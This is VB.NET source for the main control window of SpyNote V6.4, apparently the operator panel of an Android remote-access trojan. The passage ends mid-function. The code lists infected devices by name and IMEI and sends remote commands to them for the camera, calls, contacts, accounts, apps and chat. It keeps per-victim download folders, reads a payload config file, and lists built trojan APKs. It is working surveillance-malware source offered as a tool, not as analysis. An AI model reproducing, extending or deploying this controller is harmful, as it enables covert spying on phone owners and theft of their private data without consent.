Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Threading
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Server
Imports SpyNote_V6._4.SN.SPYXml
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class MainSpyNote
    Public Socket As SocketServer

    Public SpyXml As XMLSettings

    Public imageList_Flags As ImageList

    Public BlackList As List(Of String)

    Private NothingBitmap As Bitmap

    Public RowsToolTip As SN.ToolTip_0

    Public ToolTip_0 As SN.ToolTip_0

    Public ToolTip_1 As SN.ToolTip_0

    Public ToolTip_2 As SN.ToolTip_0

    Public ToolTip_3 As SN.ToolTip_0

    Public ToolTip_4 As SN.ToolTip_0

    Public Collection_0 As Collection

    Private L1MouseDown As Boolean

    Private L2MouseDown As Boolean

    Private L3MouseDown As Boolean

    Private xPNL1 As Integer

    Private xPNL2 As Integer

    Private xPNL3 As Integer

    Private bPNL1 As Boolean

    Private bPNL2 As Boolean

    Private bPNL3 As Boolean

    Private MySplitX As Form

    Private SplitaX As Integer

    Private MySplity As Form

    Private Splitay As Integer

    Public RowsToolTipShow As Boolean

    Public ContinueTrans As Boolean

    Private int0 As Integer

    Private int1 As Integer

    Private int2 As Integer

    Private remov As Integer

    Private x As Integer

    Private y As Integer

    Private DataLogsView_X As Integer

    Private DataLogsView_Y As Integer

    Private DataBlackListView_X As Integer

    Private DataBlackListView_Y As Integer

    Private DataMonitorAndroidView_X As Integer

    Private DataMonitorAndroidView_Y As Integer

    Private num98 As String

    Private aq1 As Integer

    Private aq2 As Integer

    Private aq4 As Integer

    Private aq5 As Integer

    Private bol0 As Boolean

    Private bol1 As Boolean

    Private bol2 As Boolean

    Private bol3 As Boolean

    Private Const WM_COPYDATA As Integer = 74

    Public PublicPID As Integer

    Public SPL As String

    Private SPL1 As String

    Private keeys0 As Integer

    Private keeys1 As Integer

    Private keeys2 As Integer

    Private clrSplit As Color
    Public Sub New()
        Me.imageList_Flags = New ImageList()
        Me.BlackList = New List(Of String)()
        Me.NothingBitmap = New Bitmap(1, 1)
        Me.RowsToolTip = New SN.ToolTip_0()
        Me.ToolTip_0 = New SN.ToolTip_0()
        Me.ToolTip_1 = New SN.ToolTip_0()
        Me.ToolTip_2 = New SN.ToolTip_0()
        Me.ToolTip_3 = New SN.ToolTip_0()
        Me.ToolTip_4 = New SN.ToolTip_0()
        Me.Collection_0 = New Collection()
        Me.SplitaX = 1
        Me.Splitay = 1
        Me.remov = 0
        Me.num98 = ""
        Me.PublicPID = -1
        Me.SPL = "x8x9x8x"
        Me.SPL1 = "x4x9x4x"
        Me.clrSplit = Color.FromArgb(63, 63, 70)
        Me.InitializeComponent()
        Data.SpyNote = Me
        Me.PNLWOW.Visible = True
    End Sub

    Private Sub _ClientFolder()
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    Dim str As String = String.Concat(New String() {Store.Resources(1), "\Clients\", tag.ClientName, "_", tag.ClientImei})
                    If (Not File.Exists(str)) Then
                        If (Not My.Computer.FileSystem.DirectoryExists(str)) Then
                            My.Computer.FileSystem.CreateDirectory(str)
                        End If
                        Process.Start(str)
                    Else
                        Process.Start(str)
                    End If
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub _Downloads()
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    Dim str As String = String.Concat(New String() {Store.Resources(1), "\Clients\", tag.ClientName, "_", tag.ClientImei, "\Downloads"})
                    If (Not File.Exists(str)) Then
                        If (Not My.Computer.FileSystem.DirectoryExists(str)) Then
                            My.Computer.FileSystem.CreateDirectory(str)
                        End If
                        Process.Start(str)
                    Else
                        Process.Start(str)
                    End If
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub AboutSpyNoteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles AboutSpyNoteToolStripMenuItem.Click
        Dim aboutSpyNote As AboutSpyNote = New AboutSpyNote()
        If (aboutSpyNote.ShowDialog() <> System.Windows.Forms.DialogResult.OK) Then
            aboutSpyNote.Close()
        Else
            aboutSpyNote.Close()
        End If
    End Sub

    Private Sub AccountManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles AccountManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(25)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub ApkS()
        Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.BuildingFolderToolStripMenuItem.Tag, "", False)))
        If flag Then
            Dim flag2 As Boolean = My.Computer.FileSystem.DirectoryExists(Me.BuildingFolderToolStripMenuItem.Tag.ToString())
            If flag2 Then
                Dim instance As Object = Nothing
                Dim typeFromHandle As Type = GetType(Process)
                Dim memberName As String = "Start"
                Dim array As Object() = New Object(0) {}
                Dim num As Integer = 0
                Dim buildingFolderToolStripMenuItem As ToolStripMenuItem = Me.BuildingFolderToolStripMenuItem
                Dim toolStripMenuItem As ToolStripMenuItem = buildingFolderToolStripMenuItem
                array(num) = buildingFolderToolStripMenuItem.Tag
                Dim array2 As Object() = array
                Dim argumentNames As String() = Nothing
                Dim typeArguments As Type() = Nothing
                Dim array3 As Boolean() = New Boolean() {True}
                Dim array4 As Boolean() = array3
                NewLateBinding.LateCall(instance, typeFromHandle, memberName, array, argumentNames, typeArguments, array3, True)
                If array4(0) Then
                    toolStripMenuItem.Tag = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array2(0)))
                End If
            End If
        End If
    End Sub

    Private Sub ApplicationsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ApplicationsToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(28)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub BADD0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BADD0.Click
        Dim str As String = Me.TTextAddress.Text.Trim()
        If (Not (Me.BlackList.Contains(str) Or Operators.CompareString(str, Nothing, False) = 0 Or Not Store.CheckIPAddress(str))) Then
            Me.DataBlackListView.Focus()
            Me.BlackList.Add(str)
            Me.TTextAddress._CBorderLave0_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress._CBorderLave1_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress.__CLRXX_S = Color.FromArgb(100, 100, 100)
            Me.RefreshBlackListView()
        Else
            Me.TTextAddress.Focus()
            Me.TTextAddress._CBorderLave0_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress._CBorderLave1_S = Color.FromArgb(72, 72, 74)
            Me.TTextAddress.__CLRXX_S = Color.FromArgb(222, 80, 80)
        End If
        Me.TTextAddress.Refresh()
    End Sub

    Private Sub BAutoDelete0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BAutoDelete0.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.BAutoDelete0.Tag, Nothing, False)) Then
            Me.BAutoDelete0.Tag = Nothing
            Me.BAutoDelete0.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.BAutoDelete0.backColorNone1 = Color.FromArgb(45, 45, 48)
        Else
            Me.BAutoDelete0.Tag = "AutoDelete"
            Me.BAutoDelete0.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.BAutoDelete0.backColorNone1 = Color.FromArgb(78, 201, 148)
        End If
    End Sub

    Private Sub BAutoDelete1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BAutoDelete1.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.BAutoDelete1.Tag, Nothing, False)) Then
            Me.BAutoDelete1.Tag = Nothing
            Me.BAutoDelete1.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.BAutoDelete1.backColorNone1 = Color.FromArgb(45, 45, 48)
        Else
            Me.BAutoDelete1.Tag = "AutoDelete"
            Me.BAutoDelete1.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.BAutoDelete1.backColorNone1 = Color.FromArgb(78, 201, 148)
        End If
    End Sub

    Private Sub BDelete0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDelete0.Click
        If (Me.DataLogsView.SelectedRows.Count > 0) Then
            For i As Integer = Me.DataLogsView.SelectedRows.Count - 1 To 0 Step -1
                Me.DataLogsView.Rows.Remove(Me.DataLogsView.SelectedRows(i))
            Next

        End If
    End Sub

    Private Sub BDelete1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDelete1.Click
        Try
            If (Me.DataBlackListView.SelectedRows.Count > 0) Then
                For i As Integer = Me.DataBlackListView.SelectedRows.Count - 1 To 0 Step -1
                    Dim str As String = Conversions.ToString(Me.DataBlackListView.Rows(Me.DataBlackListView.SelectedRows(i).Index).Cells(2).Value)
                    Dim index As Integer = Me.DataBlackListView.SelectedRows(i).Index
                    Me.DataBlackListView.Rows.Remove(Me.DataBlackListView.SelectedRows(i))
                    If (Me.BlackList.Contains(str)) Then
                        Me.BlackList.RemoveAt(index)
                    End If
                Next

            End If
        Catch ex As Exception

        End Try

    End Sub

    Private Sub BDelete2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDelete2.Click
        If (Me.DataMonitorAndroidView.SelectedRows.Count > 0) Then
            For i As Integer = Me.DataMonitorAndroidView.SelectedRows.Count - 1 To 0 Step -1
                Me.DataMonitorAndroidView.Rows.Remove(Me.DataMonitorAndroidView.SelectedRows(i))
            Next

        End If
    End Sub

    Private Sub BDeleteAll0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDeleteAll0.Click
        Me.DataLogsView.Rows.Clear()
    End Sub

    Private Sub BDeleteAll1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDeleteAll1.Click
        Me.DataBlackListView.Rows.Clear()
        Me.BlackList.Clear()
    End Sub

    Private Sub BDeleteAll2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BDeleteAll2.Click
        Me.DataMonitorAndroidView.Rows.Clear()
    End Sub

    Private Sub Bdown0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Bdown0.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Bdown0.Tag, Nothing, False)) Then
            Me.Bdown0.Tag = Nothing
            Me.Bdown0.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.Bdown0.backColorNone1 = Color.FromArgb(45, 45, 48)
        Else
            Me.Bdown0.Tag = "down"
            Me.Bdown0.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.Bdown0.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.ToEndDataLogsView()
        End If
    End Sub

    Private Sub Bdown1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Bdown1.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Bdown1.Tag, Nothing, False)) Then
            Me.Bdown1.Tag = Nothing
            Me.Bdown1.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.Bdown1.backColorNone1 = Color.FromArgb(45, 45, 48)
        Else
            Me.Bdown1.Tag = "down"
            Me.Bdown1.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.Bdown1.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.ToEndDataBdownBlackListView()
        End If
    End Sub

    Private Sub Bdown2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Bdown2.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Bdown2.Tag, Nothing, False)) Then
            Me.Bdown2.Tag = Nothing
            Me.Bdown2.backColorNone0 = Color.FromArgb(45, 45, 48)
            Me.Bdown2.backColorNone1 = Color.FromArgb(45, 45, 48)
        Else
            Me.Bdown2.Tag = "down"
            Me.Bdown2.backColorNone0 = Color.FromArgb(78, 201, 148)
            Me.Bdown2.backColorNone1 = Color.FromArgb(78, 201, 148)
            Me.ToEndDataMonitorView()
        End If
    End Sub

    Private Sub BlackListToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BlackListToolStripMenuItem.Click
        Try
            If (Me.SplitContainer2.Panel2Collapsed) Then
                Me.SplitContainer2.Panel2Collapsed = False
            End If
            If (Not Me.MTabControl.TabPages.Contains(Me.TabPageBlackList)) Then
                Me.MTabControl.TabPages.Insert(0, Me.TabPageBlackList)
                Me.LabelText.TxText = Me.MTabControl.TabPages(0).Text
                Me.BlackListToolStripMenuItem.Checked = True
                Me.BlackListToolStripMenuItem.Tag = "Checked"
                Me.MTabControl.SelectTab(0)
                Me.DataGridView1.Focus()
            End If
            Me.PNLTEXT.Invalidate()
            Me.Refresh()
        Catch ex As Exception

        End Try

    End Sub
    Private Sub BOXDOWN_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles BOXDOWN.Paint
        Dim count As Integer
        e.Graphics.DrawLine(New Pen(Color.FromArgb(63, 63, 70)), 0, 1, Me.BOXDOWN.Width, 1)
        Dim solidBrush As System.Drawing.Brush = New System.Drawing.SolidBrush(Color.FromArgb(255, 241, 241, 241))
        Dim backColor As Color = Me.BOXDOWN.BackColor
        Dim r As Byte = backColor.R
        backColor = Me.BOXDOWN.BackColor
        Dim g As Byte = backColor.G
        backColor = Me.BOXDOWN.BackColor
        Dim brush As System.Drawing.Brush = New System.Drawing.SolidBrush(Color.FromArgb(220, CInt(r), CInt(g), CInt(backColor.B)))
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
        If (Me.bol1) Then
            Dim size As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq2.ToString()), font)
            Dim size1 As System.Drawing.Size = TextRenderer.MeasureText("Connections Log ", font)
            Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size1.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle)
            e.Graphics.DrawString("Connections Log ", font, solidBrush, 0!, 2.0!)
            Dim num As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width As Integer = Me.BOXDOWN.Width - size.Width
            count = Me.DataLogsView.Rows.Count
            Dim size2 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", count.ToString()), font)
            Dim rectangle1 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num, 2, Me.BOXDOWN.Width, size2.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle1)
            Dim graphics As System.Drawing.Graphics = e.Graphics
            count = Me.DataLogsView.Rows.Count
            graphics.DrawString(String.Concat("Count ", count.ToString()), font, solidBrush, CSng(num), 2.0!)
            Dim rectangle2 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width, 2, Me.BOXDOWN.Width, size.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle2)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq2.ToString()), font, solidBrush, CSng(width), 2.0!)
        ElseIf (Me.bol2) Then
            Dim size3 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq4.ToString()), font)
            Dim size4 As System.Drawing.Size = TextRenderer.MeasureText("Black List ", font)
            Dim rectangle3 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size4.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle3)
            e.Graphics.DrawString("Black List ", font, solidBrush, 0!, 2.0!)
            Dim num1 As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width1 As Integer = Me.BOXDOWN.Width - size3.Width
            count = Me.DataBlackListView.Rows.Count
            Dim size5 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", count.ToString()), font)
            Dim rectangle4 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num1, 2, Me.BOXDOWN.Width, size5.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle4)
            Dim graphic As System.Drawing.Graphics = e.Graphics
            count = Me.DataBlackListView.Rows.Count
            graphic.DrawString(String.Concat("Count ", count.ToString()), font, solidBrush, CSng(num1), 2.0!)
            Dim rectangle5 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width1, 2, Me.BOXDOWN.Width, size3.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle5)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq4.ToString()), font, solidBrush, CSng(width1), 2.0!)
        ElseIf (Not Me.bol3) Then
            Dim size6 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font)
            Dim size7 As System.Drawing.Size = TextRenderer.MeasureText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(String.Concat("Online ", Strings.Space(10), "Down "), Me.PView.Rows(3).Cells(2).Value), Strings.Space(10)), " Up "), Me.PView.Rows(4).Cells(2).Value)), font)
            Dim rectangle6 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size7.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle6)
            e.Graphics.DrawString(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(String.Concat("Online ", Strings.Space(10), "Down "), Me.PView.Rows(3).Cells(2).Value), Strings.Space(10)), " Up "), Me.PView.Rows(4).Cells(2).Value)), font, solidBrush, 0!, 2.0!)
            Dim num2 As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width2 As Integer = Me.BOXDOWN.Width - size6.Width
            count = Me.DataGridView1.Rows.Count
            Dim size8 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", count.ToString()), font)
            Dim rectangle7 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num2, 2, Me.BOXDOWN.Width, size8.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle7)
            Dim graphics1 As System.Drawing.Graphics = e.Graphics
            count = Me.DataGridView1.Rows.Count
            graphics1.DrawString(String.Concat("Count ", count.ToString()), font, solidBrush, CSng(num2), 2.0!)
            Dim rectangle8 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width2, 2, Me.BOXDOWN.Width, size6.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle8)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font, solidBrush, CSng(width2), 2.0!)
        Else
            Dim size9 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq5.ToString()), font)
            Dim size10 As System.Drawing.Size = TextRenderer.MeasureText("Monitor Android ", font)
            Dim rectangle9 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size10.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle9)
            e.Graphics.DrawString("Monitor Android ", font, solidBrush, 0!, 2.0!)
            Dim num3 As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
            Dim width3 As Integer = Me.BOXDOWN.Width - size9.Width
            count = Me.DataMonitorAndroidView.Rows.Count
            Dim size11 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", count.ToString()), font)
            Dim rectangle10 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num3, 2, Me.BOXDOWN.Width, size11.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle10)
            Dim graphic1 As System.Drawing.Graphics = e.Graphics
            count = Me.DataMonitorAndroidView.Rows.Count
            graphic1.DrawString(String.Concat("Count ", count.ToString()), font, solidBrush, CSng(num3), 2.0!)
            Dim rectangle11 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width3, 2, Me.BOXDOWN.Width, size9.Height + 5)
            e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle11)
            e.Graphics.DrawString(String.Concat("Ln ", Me.aq5.ToString()), font, solidBrush, CSng(width3), 2.0!)
        End If
    End Sub

    Private Sub BOXDOWN_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles BOXDOWN.Resize
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub BRefres0_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BRefres0.Click
        Me.RefreshBlackListView()
    End Sub

    Private Sub BuildingFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles BuildingFolderToolStripMenuItem.Click
        Me.ApkS()
    End Sub

    Private Sub CallsManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CallsManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(24)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub CameraManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CameraManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(10)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub CCMDToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CCMDToolStripMenuItem.Click
        Process.Start("cmd.exe")
    End Sub

    Private Sub ChatToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ChatToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Dim nameChat As NameChat = New NameChat()
        nameChat.aName.Text = If(Operators.CompareString(Me.num98.Trim(), "", False) = 0, "", Me.num98)
        If (nameChat.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                Dim text As String = nameChat.aName.Text
                If (Operators.CompareString(text.Trim(), "", False) <> 0) Then
                    Me.num98 = text
                    Try
                        enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
                        While enumerator.MoveNext()
                            Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                            If (tag IsNot Nothing) Then
                                tag.Nickname = text
                                tag.Send(String.Concat(Store.BFF(Store.buff, CLng(30)), Data.SplitData, text))
                            End If
                        End While
                    Finally
                    End Try
                    nameChat.Close()
                Else
                    Me.num98 = ""
                    Return
                End If
            Catch exception As System.Exception
                nameChat.Close()
            End Try
        Else
            nameChat.Close()
        End If
    End Sub

    Private Sub CheckPortsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CheckPortsToolStripMenuItem.Click
        Try
            Dim str As String = "Check_ports"
            Dim item As OpenPort = DirectCast(My.Application.OpenForms(str), OpenPort)
            If (item IsNot Nothing) Then
                Return
            Else
                item = New OpenPort() With
                {
                    .Name = str,
                    .Text = str
                }
                Dim textBox As System.Windows.Forms.TextBox = item.textport
                Dim port As Integer = DirectCast(Me.Socket.Listener.LocalEndpoint, IPEndPoint).Port
                textBox.Text = port.ToString()
                Dim str1 As String = String.Concat(Store.Resources(1), "\Imports\Payload\s.inf")
                If (File.Exists(str1)) Then
                    Dim strArrays As String() = File.ReadAllLines(str1)
                    If (CInt(strArrays.Length) >= 10) Then
                        item.textIP.Text = strArrays(5)
                    End If
                End If
                item.Show()
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ClientFolderDownloadsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ClientFolderDownloadsToolStripMenuItem.Click
        Me._Downloads()
    End Sub

    Private Sub ClientsFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ClientsFolderToolStripMenuItem.Click
        Dim str As String = String.Concat(Store.Resources(1), "\Clients")
        If (Not File.Exists(str)) Then
            If (Not My.Computer.FileSystem.DirectoryExists(str)) Then
                My.Computer.FileSystem.CreateDirectory(str)
            End If
            Process.Start(str)
        Else
            Process.Start(str)
        End If
    End Sub

    Private Sub Closeinformations_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Closeinformations.Click
        If (Not Me.SplitContainer1.Panel2Collapsed) Then
            Me.SplitContainer1.Panel2Collapsed = True
            Me.InformationsToolStripMenuItem.Checked = False
            Me.InformationsToolStripMenuItem.Tag = Nothing
        End If
        Me.Refresh()
    End Sub

    Private Sub Closeinformations_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles Closeinformations.MouseHover
        Me.Closeinformations.Image = Store.Bitmap_0("window\ww2")
    End Sub

    Private Sub Closeinformations_MouseLeave(ByVal sender As Object, ByVal e As EventArgs) Handles Closeinformations.MouseLeave
        Me.Closeinformations.Image = Store.Bitmap_0("window\w2")
    End Sub

    Private Sub CloseTab_Click(ByVal sender As Object, ByVal e As EventArgs) Handles CloseTab.Click
        Dim enumerator As IEnumerator = Nothing
        If (Me.MTabControl.TabPages.Count > 0) Then
            Dim text As String = Me.MTabControl.TabPages(Me.MTabControl.SelectedIndex).Text
            If (Me.MTabControl.Contains(Me.MTabControl.SelectedTab)) Then
                Me.MTabControl.TabPages.Remove(Me.MTabControl.SelectedTab)
                Try
                    enumerator = Me.ContextView.Items.GetEnumerator()
                    While enumerator.MoveNext()
                        Dim objectValue As Object = RuntimeHelpers.GetObjectValue(enumerator.Current)
                        If (Operators.CompareString(objectValue.ToString(), text, False) = 0) Then
                            NewLateBinding.LateSet(objectValue, Nothing, "Checked", New Object() {False}, Nothing, Nothing)
                            NewLateBinding.LateSet(objectValue, Nothing, "Tag", New Object(0) {}, Nothing, Nothing)
                        End If
                    End While
                Finally
                End Try
            End If
        End If
        If (Me.MTabControl.TabPages.Count <= 0) Then
            If (Not Me.SplitContainer2.Panel2Collapsed) Then
                Me.SplitContainer2.Panel2Collapsed = True
                Me.MaximTab.Image = Store.Bitmap_0("window\w0")
                Me.ToolTip_0._ToolTip.SetToolTip(Me.MaximTab, "Maximized")
            End If
        End If
        Me.Refresh()
    End Sub

    Private Sub CloseTab_MouseHover(ByVal sender As Object, ByVal e As EventArgs) Handles CloseTab.MouseHover
        Me.CloseTab.Image = Store.Bitmap_0("window\ww2")
    End Sub

    Private Sub CloseTab_MouseLeave(ByVal sender As Object, ByVal e As EventArgs) Handles CloseTab.MouseLeave
        Me.CloseTab.Image = Store.Bitmap_0("window\w2")
    End Sub

    Private Sub ContactsManagerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ContactsManagerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = Me.DataGridView1.SelectedRows.GetEnumerator()
            While enumerator.MoveNext()
                Dim tag As SocketClient = DirectCast(DirectCast(enumerator.Current, DataGridViewRow).Tag, SocketClient)
                If (tag IsNot Nothing) Then
                    tag.Send(Store.BFF(Store.buff, CLng(26)))
                End If
            End While
        Finally
        End Try
    End Sub

    Private Sub ContextControl_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles ContextControl.Opening
        If (Me.DataGridView1.Rows.Count <= 0) Then
            Me.ContextControl.Enabled = False
        Else
            Me.ContextControl.Enabled = True
        End If
    End Sub

    Private Sub ContextTools_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles ContextTools.Opening
        Me.SELCT_Apks.Items.Clear()
        Dim str As String = Conversions.ToString(Me.getDriv())
        Dim text As String = str + "Building-6.1\apktool\out"
        Dim flag As Boolean = My.Computer.FileSystem.DirectoryExists(text)
        If flag Then
            Dim directoryInfo As DirectoryInfo = New DirectoryInfo(text)
            Dim files As FileInfo() = directoryInfo.GetFiles("*.apk")
            Dim flag2 As Boolean = files.Length <= 0
            If flag2 Then
                Me.sgsdfgvdfv.Enabled = False
                Me.BuildingFolderToolStripMenuItem.Tag = ""
                Me.BuildingFolderToolStripMenuItem.Enabled = False
            Else
                Me.BuildingFolderToolStripMenuItem.Tag = text
                Me.BuildingFolderToolStripMenuItem.Enabled = True
                Me.sgsdfgvdfv.Enabled = True
                Dim num As Integer = files.Length - 1
                For i As Integer = 0 To num
                    Dim num2 As Integer = i * 10
                    Dim toolStripMenuItem As ToolStripMenuItem = New ToolStripMenuItem() With {.Text = files(i).Name, .Name = "m_item" + Conversions.ToString(Me.SELCT_Apks.Items.Count), .Tag = files(i).FullName, .ImageScaling = ToolStripItemImageScaling.None}
                    AddHandler toolStripMenuItem.Click, AddressOf Me.GetAPKs
